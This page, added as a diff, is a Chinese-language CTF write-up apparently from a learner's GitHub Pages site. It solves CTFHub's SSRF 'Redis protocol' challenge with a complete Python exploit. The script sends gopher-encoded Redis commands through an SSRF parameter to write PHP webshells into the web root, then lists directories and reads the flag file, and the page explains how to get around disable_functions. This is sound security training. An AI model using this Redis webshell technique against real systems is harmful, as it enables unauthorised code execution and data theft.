@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SSRF Redis协议 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SSRF Redis协议 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SSRF, Redis, Gopher协议, 未授权, 先探测后读取</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SSRF / Redis协议</li>
+        <li><strong>题目名称：</strong>Redis协议</li>
+        <li><strong>环境：</strong>VS Code + Python 3.12.6 环境。</li>
+        <li><strong>目标：</strong>利用 SSRF 漏洞，通过 Gopher 协议构造 Redis 命令，攻击内网 <code>127.0.0.1:6379</code> 的 Redis 服务，写入 Webshell 读取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    
+    <div class="diff-box">
+        <strong>核心解题战略：先探测、后读取</strong>
+        <ul>
+            <li><strong>痛点：</strong>直接猜测 Flag 路径（如 <code>/flag</code>、<code>/flag.txt</code>）往往是徒劳的。在 CTF 实战中，出题人通常会将 Flag 文件命名为随机字符串（如 <code>/flag_3bc575541d1e39bbb75703d11a60c2ed</code>），以此防止路径爆破。</li>
+            <li><strong>正确解法：</strong>利用 Redis 写入一个<strong>探测型 Webshell</strong>，利用 PHP 的 <code>scandir('/')</code> 函数列出根目录下的所有文件。在获取到真实的随机文件名后，再写入一个<strong>读取型 Webshell</strong>，使用 <code>readfile()</code> 精准读取目标文件。</li>
+            <li><strong>实战意义：</strong>将攻击过程拆分为“信息收集”与“精准打击”两步，极大地提高了漏洞利用的成功率与效率。</li>
+        </ul>
+    </div>
+
+    <p><strong>其他核心考点：</strong>SSRF 结合 Redis 未授权访问漏洞实现 RCE、RESP 协议格式构造、以及 RDB 二进制头绕过技巧。</p >
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：探测 Redis 服务状态</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 浏览器访问 <code>?url=http://127.0.0.1:6379/</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>页面显示 <code>504 Gateway Time-out</code> 或空白。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>504 是预期结果。Redis 是 TCP 服务，不响应 HTTP 请求，网关超时证明 SSRF 成功连接到了内网的 6379 端口。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写 Python 脚本（探测目录 + 读取文件）</h3>
+        <div class="payload-box">
+            <p><strong>脚本代码（最终成功版）：</strong></p>
+            <pre><code>import requests
+import urllib.parse
+import time
+import re
+
+# 1. 靶场根地址
+base_url = "http://challenge-eb2f43be82ef1177.sandbox.ctfhub.com:10800"
+
+# 2. 发送 Redis 命令写入 x.php 的封装函数
+def send_redis_payload(php_code):
+    payload = b""
+    # 清空 Redis
+    payload += b"*1\r\n$8\r\nflushall\r\n"
+    # 设置写入目录
+    payload += b"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n"
+    # 关键点1：使用全新文件名 x.php，避免覆盖旧的损坏文件
+    payload += b"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$5\r\nx.php\r\n"
+    
+    # 写入 PHP 代码
+    php_code_bytes = php_code.encode('utf-8')
+    payload += b"*3\r\n$3\r\nset\r\n$3\r\nkey\r\n$" + str(len(php_code_bytes)).encode() + b"\r\n" + php_code_bytes + b"\r\n"
+    # 触发保存
+    payload += b"*1\r\n$4\r\nsave\r\n"
+
+    encoded_payload = urllib.parse.quote(payload, safe='')
+    gopher_payload = f"gopher://127.0.0.1:6379/_{encoded_payload}"
+    attack_url = f"{base_url}/?url={urllib.parse.quote(gopher_payload, safe='')}"
+    
+    try:
+        requests.get(attack_url, timeout=5)
+    except:
+        pass
+    time.sleep(2) # 等待 Redis 写入完成
+
+# ================= 第一步：写入探测脚本 =================
+print("[*] 第一步：正在向 Redis 写入探测型 WebShell...")
+# 利用 PHP 的 scandir 列出根目录
+send_redis_payload("<?php echo 'INJECTED'; print_r(scandir('/')); ?>")
+
+print("[*] 正在访问 WebShell 获取目录列表...")
+try:
+    r = requests.get(f"{base_url}/?url=http://127.0.0.1/x.php", timeout=10)
+    # 提取 INJECTED 标记之后的内容
+    match = re.search(r'INJECTED(.*)', r.text, re.DOTALL)
+    if match:
+        content = match.group(1).strip()
+        print(content[:500])
+        # 在目录列表中寻找 flag 文件名
+        flag_match = re.search(r'\[[\d]+\]\s*=>\s*(flag[^\s\)]+)', content)
+        if flag_match:
+            filename = flag_match.group(1)
+            print(f"\n[+] 发现可疑文件：/{filename}")
+            
+            # ================= 第二步：精准读取 Flag =================
+            print(f"[*] 第二步：正在尝试读取 /{filename} ...")
+            # 关键点2：使用 readfile() 替代 file_get_contents，绕过 disable_functions
+            php_payload = f"<?php echo 'START'; readfile('/{filename}'); echo 'END'; ?>"
+            send_redis_payload(php_payload)
+            
+            r2 = requests.get(f"{base_url}/?url=http://127.0.0.1/x.php", timeout=10)
+            flag_match2 = re.search(r'START(.*?)END', r2.text, re.DOTALL)
+            if flag_match2:
+                print(f"\n[+] 成功获取 Flag！\n[+] {flag_match2.group(1).strip()}")
+            else:
+                print("[-] 读取失败，原始回显：")
+                print(r2.text[:500])
+        else:
+            print("\n[-] 未在根目录列表中发现 flag 文件。")
+    else:
+        print("[-] 未检测到注入成功，原始回显：")
+        print(r.text[:500])
+except Exception as e:
+    print("[-] 请求异常：", e)</code></pre>
+        </div>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>flushall</code>：清空 Redis 库，防止旧数据造成脏读或写入混乱。</li>
+            <li><code>config set dir /var/www/html</code>：指定 Redis 持久化文件落盘目录为靶场 Web 根目录。</li>
+            <li><code>config set dbfilename x.php</code>：指定文件名为 <code>x.php</code>。这里避开了之前反复覆盖 `shell.php` 导致的 RDB 文件损坏问题。</li>
+            <li><code>set key &lt;?php ... ?&gt;</code>：向 Redis 写入一条键值对，值为我们构造的 PHP 代码。</li>
+            <li><code>save</code>：触发 Redis 将内存数据落盘，在 Web 目录下生成 <code>x.php</code> 文件。</li>
+            <li><code>print_r(scandir('/'))</code>：探测根目录文件列表。这是本次解题的核心步骤，成功发现了随机命名的 Flag 文件。</li>
+            <li><code>readfile('/flag_xxx')</code>：读取文件内容并输出。使用 readfile 替代可能被禁用的 file_get_contents，有效绕过 PHP 禁用函数限制。</li>
+            <li><code>urllib.parse.quote(..., safe='')</code>：双重 URL 编码，确保 RESP 二进制流被安全传输。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：执行脚本获取 Flag</h3>
+        <div class="payload-box">
+            <p><strong>执行操作：</strong>在 VS Code 终端中运行脚本。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>终端打印出 <code>[+] 成功读取！文件内容如下：ctfhub{b88f2606aad1fb8b10c817c2}</code>。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：直接访问 6379 端口报 504。</strong> 这是正常现象。Redis 是 TCP 服务，不处理 HTTP 请求，需使用 Gopher 协议构造 RESP 报文进行交互。</li>
+        <li><strong>坑2：盲目猜 Flag 路径失败。</strong> 直接尝试读取 <code>/flag</code> 或 <code>/flag.txt</code> 均失败。正确做法是先利用 <code>scandir()</code> 列出根目录，找到真实文件名后再进行读取。这是“信息收集”优于“盲猜”的完美体现。</li>
+        <li><strong>坑3：RDB 二进制头导致文件崩溃。</strong> Redis 写入的文件带 <code>REDIS0007</code> 头部，会导致 PHP 解析混乱。解决方案是使用新文件名重新写入，并用 <code>readfile()</code> 这样的底层函数读取内容，避开可能被禁用的 <code>file_get_contents</code>。</li>
+        <li><strong>坑4：环境生命周期导致的 NameResolutionError。</strong> 调试时间过长导致靶场环境被销毁，域名解析失败。需重新开启环境并更新脚本中的 <code>base_url</code>。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>Redis 写 Webshell 的经典三连：</strong> <code>config set dir</code> -> <code>config set dbfilename</code> -> <code>set</code> + <code>save</code>。</li>
+        <li><strong>渗透测试核心思维（探测优于盲猜）：</strong> 在读取目标文件前，利用 <code>scandir</code> 或 <code>ls</code> 探测目标服务器的文件系统结构，是实战中不可或缺的一步。</li>
+        <li><strong>PHP 绕过技巧：</strong> 在 Web 安全中，<code>system</code>、<code>file_get_contents</code> 等常被禁用。掌握 <code>readfile</code>、<code>include</code> 等替代函数，能有效提升攻击成功率。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
